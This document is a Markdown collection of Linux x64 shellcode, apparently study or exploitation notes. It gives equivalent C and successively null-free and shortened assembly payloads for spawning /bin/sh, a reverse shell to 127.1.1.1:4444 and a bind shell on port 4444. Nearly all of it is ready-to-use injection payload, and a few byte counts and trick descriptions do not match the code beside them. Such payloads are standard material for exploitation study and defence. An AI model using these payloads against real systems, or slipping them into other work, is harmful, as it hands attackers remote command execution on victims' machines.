# Linux x64 Shellcode

## Spawn Shell

### Equivalent C code

```c
execve("/bin/sh", NULL, NULL);
```

### Basic Shellcode

32 bytes, non-null-free

```
mov rax, 0x3b
lea rdi, [rel shell]
mov rsi, 0x0
mov rdx, 0x0
syscall
shell: db "/bin/sh", 0
```

### Null-Free Shellcode

26 bytes, null-free

Some tricks to remove null bytes:
1. `mov rsi, 0` → `xor rsi, rsi`
2. `mov rax, 0x3b` → `push 0x3b ; pop rax`
3. Build the string `"/bin/sh"` on the fly to remove the terminated null byte.
    1. Use `push rdx` (given that the last byte of `rdx` is 0) to add a null byte
    2. Use `mov rbx, 0x68732f2f6e69622f ; push rbx` to push `"/bin//sh"` onto the stack
    3. Set `rdi` to `rsp`

```
push 0x3b
pop rax
xor rsi, rsi
xor rdx, rdx
mov rbx, 0x68732f2f6e69622f
push rdx
push rbx
mov rdi, rsp
syscall
```

### Null-Free Shortened Shellcode

26 bytes, null-free

Some tricks to shorten the shellcode:
1. `xor rsi, rsi` → `xor esi, esi` (save 1 byte)
2. `mov rdi, rsp` → `push rsp ; pop rdi` (save 1 byte)
3. Use `imul esi` to set `eax` (`rax`) and `edx` (`rdx`) to 0 simultaneously (given that `esi` is 0)

```
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
```

## Reverse Shell

### Equivalent C code

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
addr.sin_addr.s_addr = inet_addr("127.1.1.1");
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);
execve("/bin/sh", NULL, NULL);
```

### Basic Shellcode

120 bytes, non-null-free

```
; s = socket(AF_INET, SOCK_STREAM, 0)
mov rdi, 0x2
mov rsi, 0x1
mov rdx, 0x0
mov rax, 0x29
syscall
; connect(s, [AF_INET, port, ip], 0x10)
mov rdi, rax
lea rsi, [rel sockaddr]
mov rdx, 0x10
mov rax, 0x2a
syscall
; dup2(s, 0);
mov rsi, 0x0
mov rax, 0x21
syscall
; dup2(s, 1);
mov rsi, 0x1
mov rax, 0x21
syscall
; dup2(s, 2);
mov rsi, 0x2
mov rax, 0x21
syscall
; execve("/bin/sh", 0, 0)
mov rax, 0x3b
lea rdi, [rel shell]
mov rsi, 0x0
mov rdx, 0x0
syscall
sockaddr: db 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x01, 0x01, 0x01
shell: db "/bin/sh", 0
```

### Null-Free Shellcode

89 bytes, null-free

Some tricks to remove null bytes:
1. `mov rdx, 0x0` → `xor rdx, rdx`
2. `mov rdi, 0x2` → `push 0x2 ; pop rdi`
3. Build the sockaddr on the fly to remove null bytes
    - `lea rsi, [rel sockaddr]` → `push 0x101017f ; push word 0x5c11 ; push word 0x2 ; push rsp ; pop rsi`

```
; s = socket(AF_INET, SOCK_STREAM, 0)
push 0x2
pop rdi
push 0x1
pop rsi
xor rdx, rdx
push 0x29
pop rax
syscall
; connect(s, [AF_INET, port, ip], 0x10)
mov rdi, rax
push 0x101017f
push word 0x5c11
push word 0x2
push rsp
pop rsi
push 0x10
pop rdx
push 0x2a
pop rax
syscall
; dup2(s, 0);
xor rsi, rsi
push 0x21
pop rax
syscall
; dup2(s, 1);
push 0x1
pop rsi
push 0x21
pop rax
syscall
; dup2(s, 2);
push 0x2
pop rsi
push 0x21
pop rax
syscall
; execve("/bin/sh", 0, 0)
push 0x3b
pop rax
xor rsi, rsi
xor rdx, rdx
mov rbx, 0x68732f2f6e69622f
push rdx
push rbx
mov rdi, rsp
syscall
```

### Null-Free Shortened Shellcode

64 bytes, null-free, shortened

Some tricks to shorten the shellcode:

1. `xor rdx, rdx` → `cdq` (save 2 bytes, given that `rax` is a positive number)
2. `mov rdi, rax` → `xchg rdi, rax` (save 1 byte)
3. Change some operands from 32 bit registers (e.g. `eax`) to 64 bit ones (e.g. `rax`) to save bytes.
    - e.g., `xchg rax, rdi` requires 2 bytes, but `xchg eax, edi` only requires 1 byte.
    - e.g., `mov rsi, rdi` requires 3 bytes, but `mov esi, edi` only requires 1 bytes.
4. `dup(s, 0)` and `dup(s, 1)` and `dup(s, 2)` can be done using a loop
5. Save bytes by changing or removing unnecessary instructions
    - e.g. If you already know that 0 ≤ `edx` < 256, you can change `push 0x10 ; pop rdx` to `mov dl, 0x10` to save 1 byte (as only the last byte of `edx` will be changed).
    - e.g. If you already know that `esi` will be -1, you can use `inc esi` to set `esi` to 0 instead of `xor esi, esi` to save 1 byte.

```
; s = socket(AF_INET, SOCK_STREAM, 0)
push 0x2
pop rdi
push 0x1
pop rsi
push 0x29
pop rax
cdq
syscall
; connect(s, [AF_INET, port, ip], 0x10)
xchg eax, edi
push 0x101017f
push word 0x5c11
push word 0x2
push rsp
pop rsi
mov dl, 0x10
mov al, 0x2a
syscall
; dup2(s, {2, 1, 0})
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop
; execve("/bin/sh", 0, 0)
inc esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
```

## Bind Shell

### Equivalent C code

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
addr.sin_addr.s_addr = INADDR_ANY;
bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
listen(sockfd, 0);
int new_sockfd = accept(sockfd, NULL, NULL);
dup2(new_sockfd, 0);
dup2(new_sockfd, 1);
dup2(new_sockfd, 2);
execve("/bin/sh", NULL, NULL);
```

### Basic Shellcode

152 bytes, non-null-free

```
; s = socket(AF_INET, SOCK_STREAM, 0)
mov rdi, 2
mov rsi, 1
mov rdx, 0
mov rax, 0x29
syscall
; bind(s, [AF_INET, 4444, 0], 16)
mov rdi, rax
lea rsi, [rel sockaddr]
mov rdx, 0x10
mov rax, 0x31
syscall
; listen(s, 0)
mov rsi, 0x0
mov rax, 0x32
syscall
; c = accept(s, 0, 0)
mov rsi, 0x0
mov rdx, 0x0
mov rax, 0x2b
syscall
; dup2(c, 0);
mov rdi, rax
mov rsi, 0
mov rax, 0x21
syscall
; dup2(c, 1);
mov rsi, 1
mov rax, 0x21
syscall
; dup2(c, 2);
mov rsi, 2
mov rax, 0x21
syscall
; execve("/bin/sh", 0, 0)
mov rax, 0x3b
lea rdi, [rel shell]
mov rsi, 0x0
mov rdx, 0x0
syscall
sockaddr: db 0x02, 0x00, 0x11, 0x5c, 0x00, 0x00, 0x00, 0x00
shell: db "/bin/sh", 0
```

### Null-Free Shellcode

110 bytes, null-free

Some tricks to remove null bytes:
1. `mov rdx, 0x0` → `xor rdx, rdx`
2. `mov rdi, 0x2` → `push 0x2 ; pop rdi`
3. Build the sockaddr on the fly to remove null bytes
    - `lea rsi, [rel sockaddr]` → `push 0x101017f ; push word 0x5c11 ; push word 0x2 ; push rsp ; pop rsi`

```
; s = socket(AF_INET, SOCK_STREAM, 0)
push 0x2
pop rdi
push 0x1
pop rsi
xor rdx, rdx
push 0x29
pop rax
syscall
; bind(s, [AF_INET, 4444, 0], 16)
mov rdi, rax
xor rsi, rsi
push rsi
push word 0x5c11
push word 0x2
push rsp
pop rsi
push 0x10
pop rdx
push 0x31
pop rax
syscall
; listen(s, 0)
xor rsi, rsi
push 0x32
pop rax
syscall
; c = accept(s, 0, 0)
xor rsi, rsi
xor rdx, rdx
push 0x2b
pop rax
syscall
; dup2(c, 0);
mov rdi, rax
xor rsi, rsi
push 0x21
pop rax
syscall
; dup2(c, 1);
push 0x1
pop rsi
push 0x21
pop rax
syscall
; dup2(c, 2);
push 0x2
pop rsi
push 0x21
pop rax
syscall
; execve("/bin/sh", 0, 0)
push 0x3b
pop rax
xor rsi, rsi
xor rdx, rdx
mov rbx, 0x68732f2f6e69622f
push rdx
push rbx
mov rdi, rsp
syscall
```

### Null-Free Shortened Shellcode

71 bytes, null-free, shortened

Some tricks to shorten the shellcode:
1. `xor rdx, rdx` → `cdq` (save 2 bytes, given that `rax` is a positive number)
2. `mov rdi, rax` → `xchg rdi, rax` (save 1 byte)
3. Change some operands from 32 bit registers (e.g. `eax`) to 64 bit ones (e.g. `rax`) to save bytes.
    - e.g., `xchg rax, rdi` requires 2 bytes, but `xchg eax, edi` only requires 1 byte.
    - e.g., `mov rsi, rdi` requires 3 bytes, but `mov esi, edi` only requires 1 bytes.
4. `dup(s, 0)` and `dup(s, 1)` and `dup(s, 2)` can be done using a loop
5. Save bytes by changing or removing unnecessary instructions
    - e.g. If you already know that 0 ≤ `edx` < 256, you can change `push 0x10 ; pop rdx` to `mov dl, 0x10` to save 1 byte (as only the last byte of `edx` will be changed).
    - e.g. If you already know that `esi` will be -1, you can use `inc esi` to set `esi` to 0 instead of `xor esi, esi` to save 1 byte.

```
; s = socket(AF_INET, SOCK_STREAM, 0)
push 0x2
pop rdi
push 0x1
pop rsi
push 0x29
pop rax
cdq
syscall
; bind(s, [AF_INET, 4444, 0], 16)
xchg eax, edi
push rdx
push word 0x5c11
push word 0x2
push rsp
pop rsi
mov dl, 0x10
mov al, 0x31
syscall
; listen(s, 0)
xor esi, esi
mov al, 0x32
syscall
; c = accept(s, 0, 0)
cdq
mov al, 0x2b
syscall
; dup2(c, {2, 1, 0}); 
xchg eax, edi
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop
; execve("/bin/sh", 0, 0)
inc esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 0x3b
syscall
```